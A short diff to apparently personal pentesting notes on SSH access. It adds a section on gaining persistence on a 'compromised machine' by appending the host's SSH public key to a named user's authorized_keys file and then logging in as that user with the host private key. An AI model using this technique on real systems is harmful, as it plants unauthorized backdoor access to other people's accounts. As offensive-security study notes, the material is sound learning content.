@@ -26,3 +26,15 @@ chmod 600 /home/kali/.ssh/id_rsa
 ```bash
 $ ssh -i /home/kali/id_rsa user@host
 ```
+
+## ORRRR IF SSH KEY ALR EXISTS ON THE COMPROMISED MACHINE --> ADD USER'S AUTHORIZED KEYS --> SSH AS USER
+
+```bash
+cat /etc/ssh/ssh_host_rsa_key.pub >> /home/pete@complyedge.com/.ssh/authorized_keys
+# Private key: /etc/ssh/ssh_host_rsa_key
+```
+
+
+
+
+
